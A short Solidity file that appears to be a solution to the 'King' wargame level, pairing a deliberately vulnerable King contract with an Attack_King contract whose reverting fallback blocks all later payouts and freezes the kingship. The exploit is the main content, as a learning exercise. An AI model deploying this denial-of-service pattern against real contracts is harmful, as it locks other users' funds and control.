// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

    address king;
    uint public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);//transfer 可能被退回
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract Attack_King {
    constructor(address payable target) public payable {
        address(target).call{value: msg.value}("");
    }

    fallback() external payable {
        revert();
    }
}